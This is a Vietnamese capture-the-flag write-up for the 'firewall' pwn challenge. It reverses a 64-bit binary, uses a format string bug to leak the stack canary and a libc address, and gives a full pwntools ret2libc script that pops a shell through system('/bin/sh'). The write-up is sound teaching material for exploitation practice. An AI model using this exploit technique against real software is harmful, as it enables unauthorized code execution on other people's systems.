# **firewall**

## Task

File: firewall, readme.txt

Chạy lệnh `file` để kiểm tra:

```bash
└─$ file firewall
firewall: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=f3c8205e42fba83a9cea0af79f2da1e7fe1632a5, for GNU/Linux 3.2.0, not stripped
```

==> linux 64 bits

Nội dung File: readme.txt

```bash
└─$ cat readme.txt
Crack the firewall! Your goal is to get a shell! Good luck!
```

Bài này yêu cầu chúng ta chiếm shell, nên bài là một bài dang `pwn` chứ không phải `re`:

Chạy thử File:

```bash
└─$ ./firewall
C interactive firewall

[x]~> abcd
abcd
[x]~> xyz
xyz
[x]~> hello
hello
[x]~>
```

## Solution

Reverse file bằng IDA pro 64 bits

Pseudocode hàm `main`:

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [rsp+4h] [rbp-11Ch]
  char format[8]; // [rsp+Ah] [rbp-116h] BYREF
  unsigned __int64 v6; // [rsp+118h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  v4 = 0;
  puts("C interactive firewall\n");
  while ( 1 )
  {
    if ( !v4 )
      strcpy(format, "[x]~> ");
    if ( v4 == 1 )
      strcpy(format, "[*]~> ");
    printf("%s", format);
    if ( !(unsigned int)gets((__int64)&format[6]) )
      break;
    printf(&format[6]);
    putchar(10);
    if ( !strcmp(&format[6], "connect") )
    {
      puts("Opening a connetion to the firewall...");
      sleep(2u);
      v4 = 1;
      puts("Done.");
    }
    if ( !strcmp(&format[6], "send") && v4 == 1 )
    {
      puts("Enter something that should be sent to the network to test the firewall");
      printf("Input: ");
      send();
      puts("Sent.");
    }
    if ( !strcmp(&format[6], "send") && v4 != 1 )
      puts("Connect first!");
  }
  return 0;
}
```

Cách thức hoạt động của chương trình cũng rất đơn giản, là sẽ nhận input như là một chuỗi ở dạng command line, sau đó in ra chuỗi này, khi input trùng với dạng chuỗi command nằm trong `if` sẽ được thực thi khối lệnh bên trong `if`, nếu không đúng câu `if` nào thì chương trình sẽ không làm gì cả và đến lệnh nhập tiếp theo

Ở đây sẽ có hai chuỗi command chính là:
- `connect` điều kiện để gọi hàm `send`
- `send` gọi hàm send khi đã được `connect`

pseudocode hàm `send`:

```c
__int64 send()
{
  unsigned __int8 v1[264]; // [rsp+0h] [rbp-110h] BYREF
  unsigned __int64 v2; // [rsp+108h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  gets((__int64)v1);
  return check_input(v1);
}
```


Vì bài này yêu cầu chiếm shell nên sẽ có một số hướng tiếp cận như sau:
- Inject shellcode
- Overwrite địa chỉ trả về với hàm gọi shell có sẵn trong code
- Ret2Lib ( overwrite return address tới hàm gọi shell trong thư viện được linked tới file thực thi)

Để dễ dàng chọn cách tiến hành mình sẽ chạy lệnh `checksec` để kiểm tra các protection nào của file được bật:

```bash
└─$ checksec --file=firewall
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   73) Symbols       No    0
2               firewall
```
Ta thấy ở đây hầu hết tất cả các protection được bật:

Với cách tiến hành thứ nhất Inject shellcode thì không thể thực hiện bới vì Protection `NX` được bật không thể nào thực thi được shellcode trên stack

Với cách tiến hành thứ hai là Overwrite địa chỉ trả về hàm gọi shell thì cũng không được vì trong code khi reverse ra không có sẵn hàm nào có thể gọi shell được 

Vậy các cuối cùng mà ta có thể thử đó là `Ret2Lib`, với cách này chúng ta sẽ phải cần một số thứ để có thể thực hiện thành công:

- Đầu tiên để ghi đề được địa chỉ return address thì ta phải thực hiện được buffer overflow (bof), ta thấy hai hai câu lệnh nhập vào input đề dùng hàm `gets` để gọi nên sẽ không giới hạn ký tự nhập vào và dễ dàng cho bof tuy nhiên, Canary Protect được sử dụng trong bài này để kiểm tra giá trị tại `rbp-8` có thay đổi so với giá trị random được đặt vào `rbp-8` khi ở đầu chương trình hay không nếu giá trị này bị thay đổi thì sẽ phát hiện bof và thoát chương trình

![image](https://user-images.githubusercontent.com/31529599/124376505-71c5dc00-dcd1-11eb-824e-4713ae18fc55.png)


- Tuy nhiên may mắn, truy hàm `main` ngay tại dòng in ra lệnh khi gọi `prinf` dòng `19`, dòng này bị lỗ hổng `format string`, mà lỗ hổng này khá nghiêm trọng cho nên ta có thể sử dụng để khai thác được chương trình này, và cụ thể chúng ta có thể `leak` được giá trị của `canary` trên stack, để bypass được protection `Canary`

![image](https://user-images.githubusercontent.com/31529599/124376513-86a26f80-dcd1-11eb-9b5e-41451463e962.png)

- Sau khi có thể thực hiện được bof, yêu cầu tiếp theo sẽ là `leak` được base address của lib được link vào file thực thi

Vì bài này chạy trên máy, nên thường sẽ enable `ALSR` một kĩ thuật dùng để random base address của thư viện liên kết động với file thực thi , và bài này bật `PIE` để random address khi thực thi chương trình, cho nên địa chỉ của chương trình này sẽ hoàn toàn khác nhau mỗi khi thực thi. Hai kĩ thuật này dùng để ngăn chặn kĩ thuật attack `ret2lib`

Tuy nhiên, dựa vào lỗ hổng `format string` ta có thể `leak` được địa chỉ của một hàm nằm trong thư viện và sau đó tính được base address run time của thư viện khi chạy chương trình

- Sau khi có được base address và giá trị của `canary` thì ta có thể ghi đè giá trị trả về của cho địa chỉ của hàm `system` với tham số truyền vào là `/bin/sh` để gọi shell


## Sau đây sẽ đi sâu chi tiết vào quá trình attack

Để thực hiện được `format string` ta sẽ tính offset của `format string` trước tiên, thường thì sẽ là `8` hoặc `6` và offset này sẽ cố định:

Cách để tính offset này như sau, ta sẽ nhập vào `AAAAAAAA` và 100 lần `%p.`, sau đó để chương trình in ra:

![image](https://user-images.githubusercontent.com/31529599/124377082-5c05e600-dcd4-11eb-9a21-d4215dae91d1.png)

Ta có thể thấy giá trị `0x4141414141414141` chính là giá trị của chuỗi `AAAAAAAA` và cách chuỗi này `8` ký tự đây chính là `offset` của format string

Để Leak được giá trị tại một địa chỉ trên stack bằng lỗ hổng `format string`  thì ta sẽ tính `offset` khoảng cách từ `rsp` đến vị trí của giá trị đó trên stack, theo `offset` của format string được tính ở trên

### Leak canary

tiến hành debug bằng GDB, đặt break point ngay vị trí gọi `gets`:

![image](https://user-images.githubusercontent.com/31529599/124376886-40e6a680-dcd3-11eb-8fd9-0189de2f6863.png)

Vì `canary` nằm ở vị trí `rbp-8`, nên ta sẽ tính khoảng cách giữa `rsp` và `rbp-8`,

Xem giá trị của `rsp` và `rbp` trên `gdb`

![image](https://user-images.githubusercontent.com/31529599/124376945-90c56d80-dcd3-11eb-8d66-10cbeeceeea4.png)


giá trị của `offset` sẽ là: ([địa chỉ của `rbp-8`] - [địa chỉ của `rsp`])/8 + 6 = (0x7fffffffde48-0x7fffffffdd30)/8 + 6  = 41

Trong đó, kết quả phép trừ được chia cho `8` là offset của `format string` được tính ở trên, mỗi giá trị trên stack sẽ cách nhau `8` offset

`6` là vì đây là `x86-64` bit nên tham số truyền vào sẽ được lưu vào `6` thanh ghi trước khi đưa lên stack ( vì ở đây chuỗi nhập vào sẽ truyền vào hàm `printf` như là một tham số , tuy nhiên đây là hàm `printf` nên có thể nhận nhiều tham số từ `format string` )

Vậy `offset` từ `rsp` tới `rbp-8` vị trí lưu `canary` sẽ là `41`, cách đơn giản để xem giá trị lại vị trí này là sẽ truyền vào `41` chuỗi format string `%p` để xem giá tri, tuy nhiêm `format string` hỗ trợ chúng ta một cách tốt hơn để truy xuất tới vị trí của phần tử bất kỳ 

Bằng ký hiêu `$` , để truy xuất tới vị trí `41` thì sẽ là `%41$p`

Vậy để `leak` được canary ta chỉ cần nhập chuỗi format string như trên `%41$p`

![image](https://user-images.githubusercontent.com/31529599/124377491-5c9f7c00-dcd6-11eb-9a40-42cd5a3c729b.png)

## Leak lib base

IDA hỗ trợ chúng ta xem thư viện được link vào chương trình:

![image](https://user-images.githubusercontent.com/31529599/124377585-cd469880-dcd6-11eb-9f39-c2a530923843.png)

Ở đây sẽ là thư viên `/usr/lib/x86_64-linux-gnu/libc-2.31.so` ở địa chỉ `0x00007ffff7e16000` từ `0x00007ffff7f61000`

Khi thực thi chương trình ta có thể thấy thằng trên stack lưu địa chỉ trả về của hàm `main` tại ` 0x00007ffff7e17d0a  →  <__libc_start_main+234> mov edi, eax`

![image](https://user-images.githubusercontent.com/31529599/124377632-10a10700-dcd7-11eb-8ee2-c472e11653fa.png)

Và địa chỉ cùa hàm này cũng nằm trong range địa chỉ của thư viện, nên ta sẽ `leak` địa chỉ của hàm này để tính address base

Vì địa chỉ của ` <__libc_start_main+234>` là đỉa chỉ trả về của hàm `main` nên sẽ là `rbp+8` và cách `canary` là `16` bytes là bằng `2` offset format string nên offset của return address main sẽ là `43`

Chuỗi format string để leak offset sẽ là `%43$p`

Tuy nhiên địa chỉ được leak sẽ là địa chỉ của ` <__libc_start_main+234>` nến địa chỉ của hàm `__libc_start_main` sẽ là `leak_address-234`

### Ret2lib

Sau khi có địa chỉ của hàm `__libc_start_main` ta sẽ load thư viện lên sau đó lấy địa chỉ leak được trừ cho địa chỉ của offset trong file thư viện sẽ được `lib base address`

Từ lib base address ta sẽ tính được địa chỉ thực của các thành phần như `system,pop_rdi_ret,"/bin/sh"`


payload = `'ký tự padding' * [khoảng cách từ biến nhập vào tới vị trí của canary] + [giá trị của canary] + 'ký tự padding'*[khoảng cách từ canary tới địa chỉ trả về (16)] + [pop_rdi_ret để truyền tham số cho hàm system] + b'/bin/sh' (tham số của system để gọi shell) + [địa chỉ của system]`



### Script python

Bài này exploit return address của hàm `send` bởi vì trong hàm `main` là vòng lặp `while` nên khó thoát vòng lặp để return hàm và đặc biệt thì do `canary` được sinh ra khi executing cho nên canary của các hàm sẽ giống nhau, dẫn đến leak canary của hàm `main` cũng sẽ giống với `canary` của hàm `send`

Và trong hàm `send` có một đoạn code nhỏ để check trong chuỗi có các ký tự (`A,B,C,D,E,F`) nếu chuỗi nhập vào nằm trong các ký tự này sẽ bị thoát chương trình, Nên ký tự để padding sẽ phải khác các ký tự này



```python 
from pwn import *

elf = ELF('./firewall')

libc = ELF('/usr/lib/x86_64-linux-gnu/libc-2.31.so')

rop = ROP(libc)

p = process('./firewall')

fmt_str_leak_canary = '%41$llp'

# leak return address of main ->  <__libc_start_main+234>
fmt_str_leak_base_addr = '%43$llp'

p.recv()
p.sendline(fmt_str_leak_base_addr)

p.recvuntil('[x]~> ')
addr_base = p.recvline()

addr_base = int(addr_base.strip(), 16) - 234

print("Leak address of __libc_start_main: ", hex(addr_base))

offset_addr = addr_base - libc.symbols['__libc_start_main']

print('Offset lib: ', hex(offset_addr))

p.sendline(fmt_str_leak_canary)

p.recvuntil('[x]~> ')
canary = p.recvline()

canary = int(canary.strip(), 16)

print('Leak Canary: ', hex(canary))

# pass argument for function
pop_rdi_addr = offset_addr + rop.find_gadget(['pop rdi', 'ret'])[0]

system_addr = offset_addr + libc.symbols['system']

binsh_addr = offset_addr + list(libc.search(b'/bin/sh'))[0]


payload = b'N'*(0x110-0x8) + p64(canary) + b'N'*0x8 + \
    p64(pop_rdi_addr) + p64(binsh_addr) + p64(system_addr)

p.sendline('connect')
p.sendline('send')

p.recvuntil('[*]~> ')
p.sendline(payload)

p.interactive()

```


## Chạy script python

![image](https://user-images.githubusercontent.com/31529599/124378259-b6a24080-dcda-11eb-9b81-4e394f825bf5.png)

Xong, vậy là chúng ta đã chiếm được shell !!

